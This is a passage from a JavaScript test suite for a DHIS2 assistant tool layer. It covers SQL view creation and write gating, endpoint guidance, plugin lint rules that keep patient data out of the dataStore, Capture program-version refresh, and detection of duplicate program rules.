      if (opts.method === 'POST' && path === 'sqlViews') return { status: 'OK', response: { uid: opts.body.id } };
      if (/\/data\?/.test(path)) return failRun ? { _error: 'DHIS2 API 409', _status: 409, _body: { errorCode: 'E7144', message: 'Query failed because a referenced table does not exist. Please ensure analytics job was run', devMessage: 'ERROR: column h.created does not exist' } } : { pager: { total: 14 }, listGrid: { headers: [{ name: 'transferred_at' }], rows: [['2026-10-19 11:22']] } };
      if (opts.method === 'DELETE') return { status: 'OK' };
      return {};
    };
    const pre = await ctx.executeManageSqlViews({ action: 'create', name: 'x', sql_query: 'select uid from trackedentityinstance', test_variables: {} });
    truthy('create with a 2.40 table name is refused with NO request', /problem/.test(pre._error || '') && calls.length === 0);
    const failed = await ctx.executeManageSqlViews({ action: 'create', name: 'Transfer history', sql_query: TRANSFER_SQL, test_variables: { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' } });
    truthy('SQL that fails when run: the real PostgreSQL error, the misleading analytics wording explained, the view removed', /E7144/.test(failed._error || '') && /h\.created does not exist/.test(failed.db_error || '') && /not about analytics/.test(failed._hint || '') && failed.view_removed === true && calls.some((c) => c.startsWith('DELETE sqlViews/')));
    failRun = false; calls.length = 0;
    const good = await ctx.executeManageSqlViews({ action: 'create', name: 'Transfer history', sql_query: TRANSFER_SQL, test_variables: { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' } });
    truthy('success: ran once, 14 rows counted, rows withheld (patient-level), readable by every user, plugin_read sends every variable', good.success && good.test.row_count === 14 && !good.test.rows && /every logged-in user/.test(good.data_access) && /startDate:\$\{startDate\}/.test(good.plugin_read) && /orgUnit:\$\{orgUnit\}/.test(good.plugin_read));
    truthy('…POSTed with public data-read sharing "r-r-----"', calls.includes('POST sqlViews'));
    d.writeAuth = { scope: 'read_only', reason: 'verify' };
    truthy('create on a read-only turn is refused by the write gate', /Refused/.test((await ctx.executeManageSqlViews({ action: 'create', name: 'y', sql_query: 'select uid from program', test_variables: {} }))._error || ''));

    // 7. dhis2_query: the guessed endpoints are answered without a request.
    d.writeAuth = { scope: 'broad', reason: 'verify' };
    calls.length = 0;
    ctx.getSchemaIndex = async () => new Map([['dataelement', { name: 'dataElement', plural: 'dataElements' }], ['dataelements', { name: 'dataElement', plural: 'dataElements' }]]);
    const own = await ctx.executeTool('dhis2_query', { path: 'tracker/ownership/transfer' });
    truthy('GET tracker/ownership/transfer → answered (write-only; history = SQL view), nothing sent', own._scope === 'known_endpoint_guidance' && /manage_sql_views/.test(own._hint) && calls.length === 0);
    truthy('GET audits → answered, nothing sent', (await ctx.executeTool('dhis2_query', { path: 'audits' }))._scope === 'known_endpoint_guidance' && calls.length === 0);
    const sch = await ctx.executeTool('dhis2_query', { path: 'schemas/enrollment' });
    truthy('GET schemas/enrollment → "not a metadata schema" + describe, nothing sent', /no metadata schema "enrollment"/.test(sch._error || '') && /describe/.test(sch._hint) && calls.length === 0);
    await ctx.executeTool('dhis2_query', { path: 'schemas/dataElements?fields=name' });
    truthy('GET schemas/dataElements is healed to schemas/dataElement (the plural is a 404)', calls.some((c) => c === 'GET schemas/dataElement'));

    // 8. Wiring and routing.
    const R = ctx.__TOOL_ROUTER;
    truthy('manage_sql_views is routed, write-capable, manual-gated, summarised, with a manual that has the transfer recipe', !!R.manage_sql_views
      && vm.runInContext("WRITE_CAPABLE_TOOL_NAMES.has('manage_sql_views') && MANUAL_TOOLS.has('manage_sql_views') && !!TOOL_SUMMARIES.manage_sql_views && /programownershiphistory/.test(MANUAL_EXTRAS.manage_sql_views)", ctx));
    truthy('list / get / describe / run are discovery actions; create is not', ctx.isDiscoveryCall('manage_sql_views', { action: 'describe' }) && ctx.isDiscoveryCall('manage_sql_views', { action: 'run' }) && !ctx.isDiscoveryCall('manage_sql_views', { action: 'create' }));
    const names = (t) => ctx.getContextualTools({ appType: 'Dashboard' }, t, false).map((x) => x.function.name);
    const THREAD = 'can you create an install a dhis2 dashboard plugin then install it on a dashbaord that will show the transfers history that happend in all OU where we can filter by date and OU';
    truthy('the thread\'s request gets manage_sql_views and manage_custom_app', names(THREAD).includes('manage_sql_views') && names(THREAD).includes('manage_custom_app'));
    truthy('"use SQL View to find the transfer history" gets manage_sql_views', names('yes there is no tranfer program or stage, use SQL View to find the tranfer history').includes('manage_sql_views'));
    truthy('an ordinary indicator request does not', !names('create a program indicator for anc visits').includes('manage_sql_views'));
    truthy('detectSqlViewIntent: transfer history / ownership / sql view — not "transfer the data element to another stage"', ctx.detectSqlViewIntent('show the transfers history in all ou') && ctx.detectSqlViewIntent('list of transfers') && ctx.detectSqlViewIntent('create a sql view') && !ctx.detectSqlViewIntent('move this data element to another stage'));
    const sp = await ctx.buildSystemPrompt(THREAD, false, false);
    truthy('the system prompt explains that a transfer is an ownership transfer read with a SQL view', /OWNERSHIP transfer/.test(sp) && /programownershiphistory/.test(sp));

    // 9. Placement: the user's own words were refused twice.
    truthy('"install it on a dashbaord" (typo) is a placement request', ctx.userAskedToPlace([THREAD]));
    truthy('"create a dashboard plugin that shows X" alone is not', !ctx.userAskedToPlace(['create a dashboard plugin that shows ANC coverage']));
    truthy('"go ahead install and setup" after the assistant\'s "…then install it and place it on a dashboard" is a placement answer', (() => {
      vm.runInContext(`conversationHistory = [{ role: 'user', content: 'build a transfer widget' }, { role: 'assistant', content: "Once you confirm, I'll build a dashboard plugin with date-range filters — then install it and place it on a dashboard for you." }]; lastUserText = 'go ahead install and setup';`, ctx);
      return ctx.placementWasRequested();
    })());
    truthy('…but "go ahead" after a message that offered no place is not', (() => {
      vm.runInContext(`conversationHistory = [{ role: 'user', content: 'build a transfer widget' }, { role: 'assistant', content: 'Here is the preview of the widget. Shall I install it?' }]; lastUserText = 'go ahead';`, ctx);
      return !ctx.placementWasRequested();
    })());
    vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);

    // 10. Preview lint: a plugin on a view nobody can read, or without its variables.
    const sqlv = { ok00000Vw01: { id: 'ok00000Vw01', displayName: 'T', type: 'QUERY', sqlQuery: TRANSFER_SQL, sharing: { public: 'r-r-----' } }, noRead0Vw01: { id: 'noRead0Vw01', displayName: 'Transfer History (ownership)', type: 'QUERY', sqlQuery: 'select 1 from programownershiphistory', sharing: { public: 'rw------' } } };
    ctx.safeDhis2Fetch = async (path) => { const m = /^sqlViews\/(\w{11})\?/.exec(path); return m ? sqlv[m[1]] : {}; };
    const cmp = (src) => ({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src).code });
    const noRead = await ctx.checkCustomAppSqlViews(cmp("const ID = 'noRead0Vw01'; const Q = { r: { resource: 'sqlViews/' + ID + '/data', params: { paging: false } } };"), { noRead0Vw01: 'sqlViews' });
    truthy('the failed thread\'s plugin (view shared rw------) is refused: nobody could read it (E4312)', noRead.errors.some((e) => /NOBODY can read its rows/.test(e)));
    const noVars = await ctx.checkCustomAppSqlViews(cmp("const Q = { r: { resource: 'sqlViews/ok00000Vw01/data', params: ({ page }) => ({ page, startDate: '2020' }) } };"), { ok00000Vw01: 'sqlViews' });
    truthy('a plugin that never sends the view\'s variables is refused (E4307) — an object key is not sending', noVars.errors.some((e) => /never sends them/.test(e) && /startDate/.test(e)));
    const fine = await ctx.checkCustomAppSqlViews(cmp('const Q = { r: { resource: \'sqlViews/ok00000Vw01/data\', params: ({ s, e, o, page }) => ({ var: [`startDate:${s}`, `endDate:${e}`, `orgUnit:${o}`], page, pageSize: 50 }) } };'), { ok00000Vw01: 'sqlViews' });
    truthy('a plugin that sends every variable and pages on the server passes', fine.errors.length === 0 && fine.warnings.length === 0 && fine.views.length === 1);

    // 11. Pagination page sizes (the model's transfer plugin used 25: console error on every render).
    const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
    const pagLint = (src) => ctx.lintCustomAppCode({ 'plugin.jsx': ctx.compileCustomAppFile('plugin.jsx', src).code }, 'plugin', kitMeta, 'DASHBOARD').errors.filter((e) => /Pagination/.test(e.message));
    const PAG = (extra) => `const { Pagination } = D2UI;\nconst PAGE_SIZE = 25;\nconst P = ({ page, n }) => <Pagination page={page} pageCount={n} pageSize={PAGE_SIZE} total={100} onPageChange={() => {}}${extra} />;`;
    truthy('<Pagination pageSize={25}> (a constant) is refused — not on its page-size menu', pagLint(PAG('')).some((e) => /no option with the value: "25"/.test(e.message)));
    truthy('…allowed with hidePageSizeSelect or pageSizes, and with a listed size', !pagLint(PAG(' hidePageSizeSelect')).length && !pagLint(PAG(' pageSizes={["25", "50"]}')).length && !pagLint(PAG('').replace('PAGE_SIZE = 25', 'PAGE_SIZE = 50')).length);
    truthy('…and a useState(25) page size is caught too', pagLint('const { Pagination } = D2UI;\nconst { useState } = React;\nfunction P() { const [size, setSize] = useState(25); return <Pagination page={1} pageCount={3} pageSize={size} total={60} onPageChange={() => {}} />; }').length === 1);
  } finally {
    ctx.safeDhis2Fetch = saved.sdf; ctx.getSchemaIndex = saved.gsi;
    d.apiVersion = saved.apiVersion; d.writeAuth = saved.writeAuth;
    vm.runInContext('_cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG }; conversationHistory = []; lastUserText = "";', ctx);
  }
}

// Capture caches program metadata and reloads a program only when its version
// changes; DHIS2 does not raise it for stage / rule edits (live 2026-10-25: a
// form plugin's new storage field never reached Capture → "FLAG does nothing").
async function runCaptureRefreshChecks() {
  console.log('\nCapture metadata refresh (program version) & cooperating plugins:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
  const d = ctx.__dhis2();
  const saved = { sdf: ctx.safeDhis2Fetch, baseUrl: d.baseUrl, apiVersion: d.apiVersion };
  const calls = [];
  const versions = { progA000001: 3, progB000001: 0, progNew0001: 0 };
  ctx.safeDhis2Fetch = async (p, o = {}) => {
    const method = o.method || 'GET';
    calls.push(`${method} ${p}`);
    let m = p.match(/^programs\/(\w{11})\?fields=id,displayName,version/);
    if (m) return { id: m[1], displayName: `Program ${m[1]}`, version: versions[m[1]] };
    m = p.match(/^programs\/(\w{11})$/);
    if (m && method === 'PATCH') { versions[m[1]] = o.body[0].value; return { status: 'OK' }; }
    if (p.startsWith('programStages?filter=id:in:[stageA00001]')) return { programStages: [{ id: 'stageA00001', program: { id: 'progA000001' } }] };
    if (p.startsWith('programStages?filter=programStageDataElements.dataElement.id:in:[deStore0001]')) return { programStages: [{ program: { id: 'progA000001' } }, { program: { id: 'progB000001' } }] };
    if (p.startsWith('programRules?filter=id:in:[ruleGone001]')) return { programRules: [{ id: 'ruleGone001', program: { id: 'progB000001' } }] };
    if (p.startsWith('programIndicators?filter=id:in:[piAnalyt001]')) return /displayInForm/.test(p) ? { programIndicators: [{ id: 'piAnalyt001', displayInForm: false, program: { id: 'progA000001' } }] } : { _error: 'displayInForm not asked for' };
    if (p.startsWith('programIndicators?filter=id:in:[piInForm001]')) return /displayInForm/.test(p) ? { programIndicators: [{ id: 'piInForm001', displayInForm: true, program: { id: 'progA000001' } }] } : { _error: 'displayInForm not asked for' };
    if (p.startsWith('system/info')) return { version: '2.42.5.1' };
    return { _error: `unexpected ${method} ${p}` };
  };
  d.baseUrl = 'http://localhost:8081'; d.apiVersion = 42;
  try {
    await ctx.flushCaptureProgramVersionBumps();
    ctx.noteCaptureMetadataWrite('PUT', 'programStages/stageA00001?mergeMode=REPLACE', JSON.stringify({ id: 'stageA00001', program: { id: 'progA000001' }, programStageDataElements: [] }));
    let r = await ctx.flushCaptureProgramVersionBumps();
    truthy('a stage PUT raises its program\'s version by one (Capture reloads it)', r && r.bumped.length === 1 && r.bumped[0].version === '3 → 4' && versions.progA000001 === 4);
    truthy('…with a JSON Patch on /version, nothing else', calls.some((c) => c === 'PATCH programs/progA000001'));
    truthy('…and once only: nothing pending afterwards', (await ctx.flushCaptureProgramVersionBumps()) === null);
    ctx.noteCaptureMetadataWrite('PATCH', 'programStages/stageA00001', JSON.stringify([{ op: 'add', path: '/description', value: 'x' }]));
    r = await ctx.flushCaptureProgramVersionBumps();
    truthy('a JSON-Patch stage write (no program in the body) is looked up by its id', r && r.bumped[0].program_id === 'progA000001' && versions.progA000001 === 5);
    ctx.noteCaptureMetadataWrite('POST', 'metadata?importStrategy=CREATE_AND_UPDATE&atomicMode=ALL', JSON.stringify({ programs: [{ id: 'progNew0001' }], programStages: [{ id: 'stageNew001', program: { id: 'progNew0001' } }], programRules: [{ id: 'ruleNew0001', program: { id: 'progNew0001' } }] }));
    truthy('a program created / updated in the same import is left alone (new = uncached, updated = DHIS2 bumps it)', (await ctx.flushCaptureProgramVersionBumps()) === null && versions.progNew0001 === 0);
    ctx.noteCaptureMetadataWrite('PUT', 'dataElements/deStore0001', JSON.stringify({ id: 'deStore0001', name: 'Flags', valueType: 'LONG_TEXT' }));
    r = await ctx.flushCaptureProgramVersionBumps();
    truthy('a data element change bumps every program whose stages use it', r && r.bumped.map((b) => b.program_id).sort().join() === 'progA000001,progB000001');
    const pre = await ctx.captureProgramsOfDeletedObjects('DELETE', 'programRules/ruleGone001', null);
    ctx.noteCaptureMetadataWrite('DELETE', 'programRules/ruleGone001', null, pre);
    r = await ctx.flushCaptureProgramVersionBumps();
    truthy('a deleted rule\'s program is resolved BEFORE the delete and bumped after', JSON.stringify(pre) === '["progB000001"]' && r && r.bumped[0].program_id === 'progB000001');
    // Cleanup of 6 dashboard indicators sent 6 PATCH programs/<id> (play 2.43.2, 2026-11-08).
    const preAnalytics = await ctx.captureProgramsOfDeletedObjects('DELETE', 'programIndicators/piAnalyt001', null);
    ctx.noteCaptureMetadataWrite('DELETE', 'programIndicators/piAnalyt001', null, preAnalytics);
    const afterAnalytics = await ctx.flushCaptureProgramVersionBumps();
    const preInForm = await ctx.captureProgramsOfDeletedObjects('DELETE', 'programIndicators/piInForm001', null);
    truthy('deleting an analytics-only program indicator writes nothing to its program; one shown in Capture still bumps it',
      Array.isArray(preAnalytics) && preAnalytics.length === 0 && afterAnalytics === null && JSON.stringify(preInForm) === '["progA000001"]');
    ctx.noteCaptureMetadataWrite('PUT', 'dataStore/capture/dataEntryForms', JSON.stringify({ x: [] }));
    ctx.noteCaptureMetadataWrite('POST', 'tracker?async=false', JSON.stringify({ events: [{ event: 'e', programStage: 'stageA00001' }] }));
    truthy('dataStore and tracker DATA writes never bump a program', (await ctx.flushCaptureProgramVersionBumps()) === null);
    ctx.noteCaptureProgramChanged('progA000001');
    const viaTool = await ctx.executeTool('dhis2_query', { path: 'system/info' });
    truthy('executeTool runs the refresh when the call finishes and reports it as capture_refresh', viaTool && viaTool.capture_refresh && viaTool.capture_refresh.bumped[0].program_id === 'progA000001' && /reload/.test(viaTool.capture_refresh.note));
  } finally {
    ctx.safeDhis2Fetch = saved.sdf; d.baseUrl = saved.baseUrl; d.apiVersion = saved.apiVersion;
    vm.runInContext('_captureMetaPending = null;', ctx);
  }

  // Form placement hands the plugin its program / stage in its own URL.
  const src = 'http://localhost:8081/api/apps/ai-test-flag/plugin.html';
  eq('form plugin URL carries programId + programStageId', ctx.formPluginSource(src, { kind: 'program_stage', id: 'stageA00001', programId: 'progA000001' }), `${src}?programId=progA000001&programStageId=stageA00001`);
  eq('…registration form: programId only, and an old query is replaced', ctx.formPluginSource(`${src}?x=1`, { kind: 'program', id: 'progA000001', programId: 'progA000001' }), `${src}?programId=progA000001`);
  truthy('the URL query does not stop the placement from being recognised as the app\'s', ctx.isPluginSourceOf('ai-test-flag', `${src}?programId=progA000001`));

  // A plugin-owned (replace_field) field goes back to its own section on unplace.
  const sctx = { id: 'stageA00001', kind: 'program_stage', programId: 'progA000001', fieldIds: ['deA00000001', 'deStore0001', 'deB00000001', 'deC00000001'],
    fields: {}, sections: [{ id: 'secA0000001', name: 'A', fieldIds: ['deA00000001', 'deStore0001', 'deB00000001'] }, { id: 'secC0000001', name: 'C', fieldIds: ['deC00000001'] }] };
  const sdef = ctx.defaultCaptureFormConfig(sctx);
  const fmap = [{ plugin_field: 'a', field_id: 'deA00000001' }, { plugin_field: 'flags', field_id: 'deStore0001', replace_field: true }];
  const once = ctx.formWithPlugin(sdef, sctx, { key: 'ai-test-flag', name: 'Flag', source: src, fieldMap: fmap, section: null, sectionName: null, position: 'bottom' });
  truthy('replace_field takes the storage field out of its section; the plugin gets its own section', !once.sections[0].elements.some((e) => e.id === 'deStore0001') && once.sections.length === 3);
  const twice = ctx.formWithPlugin(once.sections, sctx, { key: 'ai-test-flag', name: 'Flag', source: src, fieldMap: fmap, section: null, sectionName: null, position: 'bottom' });
  truthy('placing again (upsert) leaves no empty or extra section behind', twice.sections.length === 3 && twice.sections.every((s) => s.elements.length));
  const back = ctx.formWithoutPlugin(twice.sections, 'ai-test-flag', sctx);
  truthy('unplace puts the field back in ITS section, in metadata order → exactly the default form (entry can be dropped)', back.removed === 1 && ctx.canonicalJson(back.sections) === ctx.canonicalJson(sdef));

  // Lint for cooperating plugins.
  const kit = await ctx.loadCustomAppKit().catch(() => null);
  if (kit) {
    const shake = "\nconst root = ReactDOMClient.createRoot(document.getElementById('root')); postRobot.send(window.parent, 'getPropsFromParent'); setPluginHeight;";
    const lint = (code) => ctx.lintCustomAppCode({ 'plugin.jsx': code + shake }, 'plugin', kit.meta, 'CAPTURE');
    truthy('form plugin writing without checking fieldsMetadata is warned', lint("const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'flags', value: '[]' }); };").warnings.some((w) => /never looks at fieldsMetadata/.test(w.message)));
    truthy('…checking fieldsMetadata[alias] first is not', !lint("const A = ({ values, fieldsMetadata, setFieldValue }) => { if (fieldsMetadata.flags) setFieldValue({ fieldId: 'flags', value: '[]' }); };").warnings.some((w) => /fieldsMetadata/.test(w.message)));
    // Patient data never goes into the dataStore.
    const lintAs = (files, kind, type) => ctx.lintCustomAppCode(Object.fromEntries(Object.entries(files).map(([f, c]) => [f, c + (f === 'shared.jsx' ? '' : shake)])), kind, kit.meta, type);
    const refusedPd = (r) => r.errors.some((e) => /Patient data never goes into the dataStore/.test(e.message));
    const threadCode = "const NAMESPACE = 'ai-mch-flags'; const toggle = async (row) => { const resource = 'dataStore/' + NAMESPACE + '/flags'; await engine.mutate({ resource: resource, type: storeExists ? 'update' : 'create', data: payload }); }; const A = ({ values, setFieldValue }) => null;";
    truthy('REFUSED: a Capture form plugin writing the dataStore (the thread\'s exact pattern: resource in a variable, ternary type)', refusedPd(lintAs({ 'plugin.jsx': threadCode }, 'plugin', 'CAPTURE')));
    truthy('REFUSED: a Capture enrollment widget writing a dataStore key (shorthand resource)', refusedPd(lintAs({ 'plugin.jsx': "const A = ({ enrollmentId }) => null; const resource = `dataStore/${D2_APP_CONFIG.namespace}/active`; engine.mutate({ resource, type: 'update', data: { enrollmentId } });" }, 'plugin', 'CAPTURE')));
    truthy('REFUSED: an app that reads tracker events and writes the dataStore', refusedPd(lintAs({ 'app.jsx': "const Q = { ev: { resource: 'tracker/events', params: { fields: 'event' } } }; const M = { resource: 'dataStore/ai-x/cache', type: 'create', data: ({ d }) => d };" }, 'app', null)));
    truthy('REFUSED: a dashboard plugin reading line-list analytics and writing userDataStore', refusedPd(lintAs({ 'plugin.jsx': "const Q = { r: { resource: 'analytics/events/query/abcdefghijk' } }; engine.mutate({ resource: 'userDataStore/ns/k', type: 'update', data: rows });" }, 'plugin', 'DASHBOARD')));
    truthy('allowed: a Capture plugin that only READS settings from the dataStore', !refusedPd(lintAs({ 'plugin.jsx': "const A = ({ enrollmentId }) => null; const S = { s: { resource: `dataStore/${D2_APP_CONFIG.namespace}`, params: { fields: '.', filter: '_:eq:settings' } } };" }, 'plugin', 'CAPTURE')));
    truthy('allowed: app.jsx of an app_and_plugin writing settings for its Capture plugin', !refusedPd(lintAs({ 'app.jsx': "engine.mutate({ resource: `dataStore/${D2_APP_CONFIG.namespace}/settings`, type: 'update', data: s });", 'plugin.jsx': "const A = ({ enrollmentId }) => null;" }, 'app_and_plugin', 'CAPTURE')));
    truthy('allowed: a dashboard plugin saving per-item settings (aggregate analytics only)', !refusedPd(lintAs({ 'plugin.jsx': "const Q = { a: { resource: 'analytics', params: {} } }; engine.mutate({ resource: `dataStore/${D2_APP_CONFIG.namespace}/${dashboardItemId}`, type: saved ? 'update' : 'create', data: settings });" }, 'plugin', 'DASHBOARD')));
    truthy('allowed: a Capture plugin writing TRACKER data (not the dataStore)', !refusedPd(lintAs({ 'plugin.jsx': "const A = ({ values, setFieldValue }) => null; engine.mutate({ resource: 'tracker', type: 'create', params: { async: false }, data: { events: [] } });" }, 'plugin', 'CAPTURE')));
  } else bad('runtime kit could not be loaded for the lint checks');
  // …and the chatbot's own raw writes.
  const d2 = ctx.__dhis2();
  const savedTurn = { t: d2.turnCounter, p: d2.patientDataReadTurn };
  truthy('dhis2_query dataStore write with tracker record fields is refused', /tracker record data \("enrollmentId"\)/.test(ctx.dataStorePatientDataReason({ active: { enrollmentId: 'abc', at: 'x' } }) || ''));
  truthy('…nested values / events too', !!ctx.dataStorePatientDataReason(JSON.stringify({ x: { events: [{ dataValues: [] }] } })));
  d2.turnCounter = 7; d2.patientDataReadTurn = 6;
  truthy('a plain settings write is allowed', ctx.dataStorePatientDataReason({ columns: ['a'], showTotals: true }) === null);
  d2.patientDataReadTurn = 7;
  truthy('…but not in a turn that already read patient data', /already read patient-level data/.test(ctx.dataStorePatientDataReason({ columns: ['a'] }) || ''));
  d2.turnCounter = savedTurn.t; d2.patientDataReadTurn = savedTurn.p;
  const savedApps = ctx.listInstalledApps;
  ctx.listInstalledApps = async () => [{ key: 'ai-owner', activities: { dhis: { namespace: 'ai-owner' } } }];
  try {
    const spec = { namespace: 'ai-me' };
    eq('a hard-coded namespace nobody reserves is reported (const + concatenation)', await ctx.customAppUnreservedNamespaces("const NAMESPACE = 'ai-mch-flags'; const Q = { s: { resource: 'dataStore/' + NAMESPACE } };", spec), ['ai-mch-flags']);
    eq('…and as a template / literal path', (await ctx.customAppUnreservedNamespaces("const NS = 'shared-x'; const a = `dataStore/${NS}/k`; const b = 'dataStore/other/k';", spec)).sort(), ['other', 'shared-x']);
    eq('the app\'s own namespace, D2_APP_CONFIG.namespace and another app\'s reserved one are fine', await ctx.customAppUnreservedNamespaces("const a = `dataStore/${D2_APP_CONFIG.namespace}`; const b = 'dataStore/ai-owner/k'; const c = 'dataStore/ai-me';", spec), []);
  } finally { ctx.listInstalledApps = savedApps; }
  const dd = ctx.__dhis2();
  const savedUsed = dd.toolsUsedThisThread;
  dd.toolsUsedThisThread = ['manage_custom_app'];
  const followUp = await ctx.buildSystemPrompt('I am hitting flag but nothing is happening');
  dd.toolsUsedThisThread = [];
  const unrelated = await ctx.buildSystemPrompt('I am hitting flag but nothing is happening');
  dd.toolsUsedThisThread = savedUsed;
  truthy('a bug report in a thread that built a plugin gets the diagnose-first + cooperating-plugins routing', /does nothing" \/ "is not saved": diagnose with real reads first/.test(followUp) && /shared-data contract first/.test(followUp));
  truthy('…a thread that never built one does not', !/shared-data contract first/.test(unrelated));
  const manual = vm.runInContext('KB_CUSTOM_APPS_DETAILS', ctx);
  truthy('manual: cooperating plugins design the contract first and keep record data in tracker data', /### Plugins that work together/.test(manual) && /TRACKER DATA/.test(manual) && /PATIENT DATA NEVER GOES INTO THE DATASTORE/.test(manual) && /Never a shared "current record" pointer/.test(manual));
  truthy('manual: verified form-field facts (no id in fieldsMetadata, Capture address params, HIDEFIELD blanks values, save is not a server write)', /there is NO id/.test(manual) && /enrollmentEventEdit\?eventId=/.test(manual) && /BLANKS the value/.test(manual) && /needs_write_access is about engine\.mutate/.test(manual));
  truthy('manual: diagnose before changing code, and "placed" is not "working"', /### When a plugin "does nothing"/.test(manual) && /"Placed and configured" is not "working"/.test(manual));
}

async function runRuleScopeAndTetSharingChecks() {
  console.log('\nRule stage scope, duplicate rules across stages & tracked-entity-type data sharing:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
  const stageDes = new Map([['stageScreen1', new Set(['deSystolic1', 'deDiastol01', 'deSmoker001', 'deCigs00001'])], ['stageFollow1', new Set(['deSystolic1', 'deDiastol01', 'deHbA1c0001'])]]);
  const act = (type, de, stage, extra = {}) => ({ programRuleActionType: type, ...(de ? { dataElement: { id: de } } : {}), ...(stage ? { programStage: { id: stage } } : {}), ...extra });
  eq('every field action naming one stage scopes the rule to it', ctx.inferRuleStageScope([act('SHOWWARNING', 'deSystolic1', 'stageFollow1'), act('ASSIGN', 'deHbA1c0001', 'stageFollow1')], stageDes), 'stageFollow1');
  eq('…two different stages stay program-wide', ctx.inferRuleStageScope([act('SHOWWARNING', 'deSystolic1', 'stageFollow1'), act('HIDEFIELD', 'deCigs00001', 'stageScreen1')], stageDes), null);
  eq('…an action without a stage keeps the rule program-wide', ctx.inferRuleStageScope([act('SHOWWARNING', 'deSystolic1', 'stageFollow1'), act('SHOWERROR', 'deDiastol01')], stageDes), null);
  eq('…an attribute target keeps it program-wide', ctx.inferRuleStageScope([act('HIDEFIELD', null, 'stageFollow1', { trackedEntityAttribute: { id: 'teaNatId0001' } })], stageDes), null);
  eq('…HIDEPROGRAMSTAGE (the stage is the TARGET) is never a scope', ctx.inferRuleStageScope([act('HIDEPROGRAMSTAGE', null, 'stageFollow1')], stageDes), null);
  eq('…a data element that is not in the named stage is not scoped', ctx.inferRuleStageScope([act('HIDEFIELD', 'deCigs00001', 'stageFollow1')], stageDes), null);
  // The NCD case (2026-10-28): a screening and a follow-up copy of one warning on
  // a data element both stages share, each with its own CURRENT_EVENT variables.
  const v = (name, de) => ({ name, source_type: 'DATAELEMENT_CURRENT_EVENT', data_element_id: de, value_type: 'INTEGER_POSITIVE' });
  const copy = (suffix, stage) => ({
    name: `Crisis warning ${suffix}`,
    condition: `d2:hasValue(#{sys_${suffix}}) && #{sys_${suffix}} >= 180`,
    variables: [v(`sys_${suffix}`, 'deSystolic1')],
    actions: [{ type: 'SHOWWARNING', data_element_id: 'deSystolic1', content: 'Hypertensive crisis', ...(stage ? { program_stage_id: stage } : {}) }],
  });
  const scoped = [copy('screening', 'stageScreen1'), copy('followup', 'stageFollow1')];
  eq('per-stage copies that each name their stage are not duplicates', ctx.lintRuleVisibilitySemantics(scoped, [], { canonVar: ctx.buildPrvCanonicalizer([], scoped) }), []);
  const unscoped = [copy('screening'), copy('followup')];
  truthy('unscoped copies whose variables read the same data element ARE duplicates', /"Crisis warning screening" duplicates rule "Crisis warning followup"/.test(ctx.lintRuleVisibilitySemantics(unscoped, [], { canonVar: ctx.buildPrvCanonicalizer([], unscoped) }).join(' ')));
  const existing = [{ id: 'ruleOld0001', name: 'Old crisis', condition: 'd2:hasValue(#{bp_sys}) && #{bp_sys} >= 180', programRuleActions: [{ programRuleActionType: 'SHOWWARNING', content: 'Hypertensive crisis', dataElement: { id: 'deSystolic1' } }] }];
  const prvs = [{ name: 'bp_sys', programRuleVariableSourceType: 'DATAELEMENT_CURRENT_EVENT', dataElement: { id: 'deSystolic1' } }];
  truthy('…also against an existing rule on the program (server shape)', ctx.lintRuleVisibilitySemantics([copy('screening')], existing, { canonVar: ctx.buildPrvCanonicalizer(prvs, [copy('screening')]) }).length === 1);
  eq('…but not against an existing rule scoped to another stage', ctx.lintRuleVisibilitySemantics([copy('screening', 'stageScreen1')], [{ ...existing[0], programStage: { id: 'stageFollow1' } }], { canonVar: ctx.buildPrvCanonicalizer(prvs, [copy('screening')]) }), []);
  eq('…a different message on the same field is not a duplicate', ctx.lintRuleVisibilitySemantics([copy('screening'), { ...copy('followup'), actions: [{ type: 'SHOWWARNING', data_element_id: 'deSystolic1', content: 'Recheck in 5 minutes' }] }], [], { canonVar: ctx.buildPrvCanonicalizer([], unscoped) }), []);
  eq('a NEWEST_EVENT_PROGRAM variable is not the same source as a CURRENT_EVENT one', ctx.lintRuleVisibilitySemantics(unscoped, [], { canonVar: ctx.buildPrvCanonicalizer([], [copy('screening'), { ...copy('followup'), variables: [{ ...v('sys_followup', 'deSystolic1'), source_type: 'DATAELEMENT_NEWEST_EVENT_PROGRAM' }] }]) }), []);
  // Tracked entity type data sharing.
  eq('addDataBits adds data bits only', [ctx.addDataBits('rw------', 'rwrw----'), ctx.addDataBits('r-r-----', 'r-rw----'), ctx.addDataBits('rwrw----', 'r-r-----'), ctx.addDataBits('--------', 'r-rw----')], ['rwrw----', 'r-rw----', 'rwrw----', 'r-rw----']);
  const saved = { sdf: ctx.safeDhis2Fetch, bk: ctx.ensureBackupOrBail };
  const puts = [];
  let tetPublic = 'rw------';
  ctx.ensureBackupOrBail = async () => ({ ok: true, block: { backup_key: 'bk' } });
  ctx.safeDhis2Fetch = async (p, o = {}) => {
    if (o.method === 'PUT') { puts.push({ p, body: o.body }); return { status: 'OK' }; }
    if (/^programs\/progNcd0001\?fields=programType/.test(p)) return { programType: 'WITH_REGISTRATION', trackedEntityType: { id: 'tetPerson01', displayName: 'person' } };
    if (p === 'sharing?type=program&id=progNcd0001') return { object: { publicAccess: 'rwrw----', userGroupAccesses: [{ id: 'grpNurses01', access: 'r-rw----' }], userAccesses: [] } };
    if (p === 'sharing?type=trackedEntityType&id=tetPerson01') return { object: { publicAccess: tetPublic, userGroupAccesses: [{ id: 'grpViewer01', access: 'r-r-----' }], userAccesses: [] } };
    if (/^programs\?filter=trackedEntityType/.test(p)) return { programs: [{ displayName: 'A' }, { displayName: 'B' }] };
    return { _error: `unexpected ${p}` };
  };
